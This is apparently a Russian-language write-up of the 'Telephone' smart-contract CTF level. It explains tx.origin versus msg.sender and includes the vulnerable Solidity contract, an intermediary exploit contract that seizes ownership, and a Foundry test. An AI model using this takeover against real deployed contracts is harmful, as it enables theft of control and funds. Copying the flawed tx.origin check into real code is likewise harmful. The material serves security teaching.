# 4. Telephone

В предоставленном контракте содержится логика смены владельца контракта только при том условии, что `tx.origin` будет отличаться от `msg.sender`. 
`tx.origin`: отправитель транзакции (полная цепочка вызовов).
`msg.sender`: отправитель сообщения (текущий вызов).

Если пользователь `X` вызовет `A.func()`, то внутри нее `tx.origin` равен `msg.sender`.
Если пользователь `X` вызовет `B.func()`, который вызовет `A.func()`, то внутри `A` `msg.sender` равен `B`, а `tx.origin` равен `X`. 

Код контракта `Telephone.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

Код эксплоита `TelephoneExploit.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneExploit {
    ITelephone public telephone;

    constructor(address _targetContractAddress) {
        telephone = ITelephone(_targetContractAddress);
    }

    function exploit(address _newOwner) external {
        telephone.changeOwner(_newOwner);
    }
}
```

Проверка эксплоита `TelephoneExploit.t.sol`:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Telephone} from "src/Telephone/Telephone.sol";
import {TelephoneExploit} from "src/Telephone/TelephoneExploit.sol";

contract TelephoneExploitTest is Test {
    Telephone public target;
    TelephoneExploit public exploit;

    address public oldOwner = address(0x1111);
    address public newOwner = address(0xffff);

    function setUp() public {
        vm.startPrank(oldOwner);
        target = new Telephone();
        vm.stopPrank();

        vm.startPrank(newOwner);
        exploit = new TelephoneExploit(address(target));
        vm.stopPrank();
    }

    function test_Exploit() public {
        assertEq(oldOwner, target.owner());
        exploit.exploit(newOwner);
        assertEq(newOwner, target.owner());
    }
}
```